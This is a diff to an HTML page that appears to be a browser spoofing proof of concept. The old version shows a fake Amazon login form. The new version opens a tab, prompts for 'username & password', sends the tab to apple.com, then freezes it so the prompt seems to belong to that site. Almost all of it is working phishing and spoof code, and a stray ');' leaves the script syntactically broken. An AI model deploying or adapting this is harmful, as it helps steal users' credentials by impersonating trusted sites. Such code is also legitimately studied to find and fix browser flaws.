@@ -1,16 +1,61 @@
-<head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-</head>
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, user-scalable=yes"
+    />
+    <title>testeraza</title>
+  </head>
+  <body>
+    <button
+      id="startBtn"
+      style="
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        padding: 15px 30px;
+        font-size: 18px;
+        background: #007aff;
+        color: #fff;
+        border: none;
+        border-radius: 10px;
+        cursor: pointer;
+        z-index: 10000;
+      "
+    >
+      CLICK HERE
+    </button>
 
-<body>
-<a href="javascript:window.open('https://www.amazon.com/','x');" onclick="startSpoof()" id="button">Spoof</a>
-</body>
+    <script>
+      document.getElementById("startBtn").onclick = function () {
+        this.remove();
+        const newTab = window.open("about:blank", "_blank");
+        if (newTab) {
+          prompt("username & password")
+      );
+          newTab.document.close();
 
-<script>
-document.getElementById('button').addEventListener('click', function() {
-document.body.innerHTML = ` <h1>This is not Amazon</h1>
-<input type="text" placeholder="Username" id="username"><br>
-<input type="password" placeholder="Password" id="password"><br>
-<button>Click me</button>`;
-});
-</script>
+          setTimeout(() => {
+            newTab.location.href = "https://apple.com";
+          }, 1);
+
+          setTimeout(() => {
+            try {
+              newTab.stop();
+            } catch (e) {}
+            try {
+              const sab = new SharedArrayBuffer(4);
+              const view = new Int32Array(sab);
+              Atomics.wait(view, 0, 0, 9999999);
+            } catch (e) {
+              while (true) {}
+            }
+          }, 600);
+        }
+      };
+    </script>
+  </body>
+</html>
